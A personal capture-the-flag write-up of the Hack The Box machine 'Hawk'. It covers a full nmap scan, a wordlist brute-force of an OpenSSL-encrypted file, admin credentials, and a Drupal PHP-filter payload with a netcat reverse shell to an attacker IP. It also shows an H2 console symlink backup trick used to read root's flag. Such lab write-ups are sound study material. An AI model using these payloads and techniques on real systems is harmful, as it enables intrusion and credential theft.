+++
title = "HTB - Hawk"
date = 2025-01-13
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.102          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-13 15:00 EST
Nmap scan report for 10.10.10.102
Host is up (0.13s latency).
Not shown: 65519 closed tcp ports (reset), 10 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.95%I=7%D=1/13%Time=67857115%P=aarch64-unknown-linux-gn
SF:u%r(NULL,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\
SF:0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t
SF:\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0
SF:a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\
SF:0O\0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0
SF:h\x002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0
SF:\x20\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x
SF:20\0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c
SF:\0p\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007
SF:\0-\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\
SF:0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\
SF:0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0
SF:t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o
SF:\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t
SF:\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0
SF:v\0a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.
SF:\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t
SF:\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005
SF:\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\
SF:0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e
SF:\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x
SF:20\0o\0r")%r(informix,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\
SF:0\0\0F\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0
SF:t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\
SF:0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A
SF:\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0
SF:o\0r\0g\0\.\0h\x002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0
SF:e\0p\0t\0i\0o\0n\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\
SF:0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20
SF:\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0
SF:\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x
SF:001\x001\x007\0-\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h
SF:\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.
SF:\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\
SF:0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0
SF:a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0
SF:x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0
SF:n\0\.\0j\0a\0v\0a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\
SF:.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x
SF:001\x005\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s
SF:\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0
SF:b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\
SF:0\t\0a\0t\0\x20\0o\0r");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.24 seconds

```

### Enumeration
We connect to the webserver, and it seems to be running Drupal 7. We can validate with searchsploit that this version might be vulnerable. 0xdf references a ruby tool to check, but I figured out from the failed exploit attempt.
We try to pry more with burp, but no dice. 
FTP allows anonymous connections, and we find an encrypted file to download.
OpenSSL encrypted data with a salted password.
Quick bash script to loop through rockyou with AES-256-CBC encryption type:
```
cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
```
We can view the file with: `openssl enc -d -a -AES-256-CBC -in /home/li0t/HTB/Hawk/.drupal.txt.enc -k friends`. 
Theres also a tool called openssl-bruteforce that will loop your wordlist against the file using different ciphers:
```
python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
```
Make sure to please go through these with research. Havent worked with these before.
We get a password from the file, and we can pass `admin:PencilKeyboardScanner123` to gain access to the Drupal instance
With Drupal, we can leverage the PHP filter under Modules to get code execution on the box
Once we've enabled, we can go to content, add content, and then article to pass the code. Enable PHP formatting in the article, then use:
```
`<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 >/tmp/f'); ?>`
```
We get a call back. Upgrade the shell.
Grab the user flag
USER:`99439bc04c6eacbce966cf39108104ec`

### Privilege Escalation
Good methodology here to create decent habits. Whenever you get access via web, check to see if there are any databases with creds. We can visit the` /var/www/html/sites/default/settings.php` file and find hardcoded credentials `drupal4hawk`
Weird thing here. We get a python shell when we try to `su daniel`. We can check why with `grep daniel /etc/passwd`
To escape, we can `import subprocess`, then `subprocesses.call('/bin/bash', shell=True)`
Once that's done, I run `netstat -tnlp` and see an SQL instance. This is because of H2, which is running above on port 8082. This is a Java SQL instance. We can forward the port to view the database because we have daniel's creds!
THIS IS ONLY POSSIBLE BECAUSE WE ALSO SEE H2 running as ROOT!
`ssh daniel@10.10.10.102 -L 8082:localhost:8082`, then `import pty;pty.spawn('/bin/bash')`
Visit the forwarded instance at localhost:8082
We can take advantage of an information disclosure vulnerability to get a look at the root flag. 
Go to tools, then backup. This will look for files and save them as root in a zip.
First, let's create a symbolic link so that we can access afterwards
On SSH connect, run: `ln -s /root/root.txt t.trace.db`
For whatever reason, once this is done, we can go to the portal and backup `/home/daniel/a` and `/home/daniel/` as the directory.
This will save the backup to a file called `a`. We can serve python on the victim and download the file onto our box.
unzip the file!
ROOT:`b72d479260f9725766a4ce3f7d2c0d24`
When doing write-up, go further. Gain access and reference 0xdf.
